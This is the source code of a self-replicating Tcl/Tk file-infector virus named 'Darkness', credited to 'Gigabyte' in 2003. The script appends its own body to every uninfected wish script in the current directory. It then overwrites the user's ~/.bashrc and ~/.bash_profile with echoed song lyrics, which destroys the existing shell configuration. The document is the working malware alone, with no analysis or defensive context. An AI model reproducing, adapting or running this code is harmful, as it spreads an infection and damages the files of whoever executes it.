#!/usr/bin/env wish
                             
#Darkness
#(c) 2003 Gigabyte

foreach fl [glob -directory "." -types f "*"] {
if {$fl != $argv0} {
	set target [open $fl r]

	if {[gets $target] == "#!/usr/bin/env wish"} {
		set line_read ""
	
		while {$line_read != "#Darkness" && ![eof $target]} {
			set line_read [gets $target]
		}
	
		close $target
	
		if {$line_read != "#Darkness"} {
			set line_read ""
			set target [open $fl a]
			set virus [open $argv0 r]
	
			while {$line_read != "#Darkness"} {
				set line_read [gets $virus]
			}
	
			puts $target $line_read
		
			while {![eof $virus]} {
				puts $target [gets $virus]
			}
			close $target
			close $virus
		}
	}
}}

set bashrc [open "~/.bashrc" w]
set bash_profile [open "~/.bash_profile" w]

puts $bashrc "echo\necho Lying here\necho future unclear\necho all I know\necho before the curtain dropped\necho you left the show..\necho\necho Shallow water\necho rippled by tears\necho shallow water\necho mirrors my fear\necho silent raindrops\necho soothen my skin\necho still the answers\necho stay locked down within\necho\necho '(Sylver - Shallow water)'"

puts $bash_profile "echo\necho Your world has spikes on his back and he wants to lay down on you\necho \"Don't like what I say, you best not go away\"\necho Take a look into my bag of wonders\necho \"I'll pull out something special just for you\"\necho \"Don't tell anyone\"\necho \"It'll be our secret\"\necho A weak and tainted soul I stole from you know who\necho \"You want to buy it back I'll have to charge you for two\"\necho\necho I sell society\necho \"You won't hear lies from me\"\necho \"I'll tell you everything you want to hear\"\necho I sell society\necho \"You won't hear lies from me\"\necho \"I'll sell you everything you want to buy\"\necho\necho '(Godhead - I sell society)'"

close $bashrc
close $bash_profile


